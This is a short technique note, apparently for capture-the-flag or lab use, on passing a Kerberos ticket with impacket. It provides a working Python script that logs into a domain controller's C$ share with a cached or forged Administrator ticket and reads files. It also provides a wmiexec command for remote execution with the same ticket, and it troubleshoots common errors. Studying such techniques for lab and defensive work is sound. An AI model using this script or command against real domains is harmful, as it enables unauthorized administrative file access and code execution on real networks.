# Pass-the-Ticket via impacket SMBConnection

## When this applies

- You have a `.ccache` (S4U2proxy output, getTGT, ticketer forge) and need to read remote files programmatically.
- E.g., to grab `root.txt` over SMB without touching `smbclient`/`smbexec`.
- Goal: read remote SMB files programmatically using a ticket from a ccache.

## Technique

`impacket.smbconnection.SMBConnection.kerberosLogin(useCache=True)` selects the matching ticket from `KRB5CCNAME`. The trap: `remoteName` MUST match the SPN host in the ticket (FQDN, case as in the SPN), NOT the IP.

## Steps

```python
# When you have a .ccache (S4U2proxy output, getTGT, ticketer forge) and need to
# read remote files programmatically — e.g., to grab root.txt over SMB without
# touching smbclient/smbexec. The key trap: `remoteName` MUST match the SPN host
# in the ticket (FQDN, case as in the SPN), NOT the IP. impacket compares the
# ticket's sname[1] to remoteName when picking the ticket from the cache; an IP
# there yields KRB_AP_ERR_TKT_NYV / "kerberos SessionError: ... Server not found
# in Kerberos database" even though the ticket is valid.
import os
from impacket.smbconnection import SMBConnection
os.environ['KRB5CCNAME'] = 'Administrator@cifs_dc.domain.local.ccache'
conn = SMBConnection(remoteName='dc.domain.local',   # MUST match SPN host
                     remoteHost='<DC_IP>')           # IP for the TCP connect
# Empty password/lmhash/nthash/aesKey — useCache=True pulls everything from ccache
conn.kerberosLogin(user='Administrator', password='', domain='domain.local',
                   lmhash='', nthash='', aesKey='',
                   kdcHost='<DC_IP>', useCache=True)
# Read a file off C$:
import io
buf = io.BytesIO()
conn.getFile('C$', 'Users\\Administrator\\Desktop\\root.txt', buf.write)
print(buf.getvalue().decode())
conn.close()
```

- Same pattern for WMI/SMB exec: `impacket-wmiexec -k -no-pass -target-ip <IP> Administrator@dc.domain.local` — the `Administrator@dc.domain.local` argument is the principal+SPN-host pair, `-target-ip` is the IP. Mixing them up yields the same Kerberos errors.
- `KRB5CCNAME` must be set BEFORE `from impacket.smbconnection import …` — impacket reads the env var at module import time on some versions.

## Verifying success

- The script reads and prints the file contents from the remote share.

## Common pitfalls

- `remoteName` = FQDN (matches SPN), `remoteHost` = IP for the TCP connect. Reversing them produces `KRB_AP_ERR_TKT_NYV`.
- `KRB5CCNAME` must be set before importing impacket — set it at the top of the script.

## Tools

- impacket `SMBConnection`
- impacket-wmiexec / impacket-psexec / impacket-smbexec with `-k -no-pass -target-ip`
